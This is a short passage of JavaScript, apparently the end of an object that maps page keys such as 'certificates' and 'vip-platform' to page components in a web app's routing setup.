  certificates: CertificatesPage,
  'vip-platform': VIPPlatformLandingPage
});
